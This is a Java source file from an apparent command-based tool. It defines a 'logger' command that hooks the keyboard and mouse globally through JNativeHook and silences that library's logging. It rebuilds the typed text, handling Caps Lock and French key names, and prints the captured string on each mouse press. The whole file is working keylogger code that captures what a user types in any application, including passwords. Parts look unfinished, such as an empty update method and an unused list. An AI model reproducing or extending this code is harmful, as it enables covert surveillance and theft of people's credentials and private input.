package fr.guedesite.vinfo.cmd;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseListener;
import org.jnativehook.mouse.NativeMouseMotionListener;
import org.jnativehook.mouse.NativeMouseWheelEvent;
import org.jnativehook.mouse.NativeMouseWheelListener;

public class logger extends CMDRunnable implements NativeKeyListener, NativeMouseListener, NativeMouseMotionListener, NativeMouseWheelListener{

	
	private List<String> chaine;
	private String current = "";
	private boolean isMaj = false;
	
	@Override
	public void execute(String[] arg) {
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			e.printStackTrace();
		}
		GlobalScreen.addNativeKeyListener(this);
		GlobalScreen.addNativeMouseListener(this);
		GlobalScreen.addNativeMouseMotionListener(this);
		GlobalScreen.addNativeMouseWheelListener(this);
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		logger.setUseParentHandlers(false);
		this.chaine = new ArrayList<String>();
		
	}

	@Override
	public void showHelp() {
		System.out.println("Log les activité de l'utilisateur");
		
	}
	
	@Override
	public String getDescription() {
		return "Log les activité de l'utilisateur";
	}
	
	@Override
	public void nativeKeyTyped(NativeKeyEvent nativeEvent) {
		update();
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
		String keyText = NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
		if(keyText.equals("Retour arrière") || keyText.equals("Enter")) {
			if(this.current.length() > 0) {
				this.current = this.current.substring(0, this.current.length()-1);
			}
			return;
		}
		if(keyText.equals("Caps Lock") || keyText.equals("Verrouillage des majuscules")) {
			this.isMaj = !this.isMaj;
		}
		if(keyText.length() > 1) {
			return;
		}
		if(this.isMaj) {
			this.current += keyText.toUpperCase();
		} else {
			this.current += keyText.toLowerCase();
		}
		update();
	}
	@Override
	public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
		update();
	}

	@Override
	public void nativeMouseClicked(NativeMouseEvent nativeEvent) {
		update();
		
	}

	@Override
	public void nativeMousePressed(NativeMouseEvent nativeEvent) {
		if(this.current.equals("")) {
			return;
		}
		System.out.println(this.current);
		this.current = "";
		update();
	}

	@Override
	public void nativeMouseReleased(NativeMouseEvent nativeEvent) {
		update();
		
	}
	
	
	public List<String> getChaine() {
		return this.chaine;
	}
	
	public void reset() {
		this.chaine.clear();
	}

	@Override
	public void nativeMouseMoved(NativeMouseEvent nativeEvent) {
		update();
		
	}

	@Override
	public void nativeMouseDragged(NativeMouseEvent nativeEvent) {
		update();
	}
	
	private void update() {
		
	}

	@Override
	public void nativeMouseWheelMoved(NativeMouseWheelEvent nativeEvent) {
		update();
		
	}

}
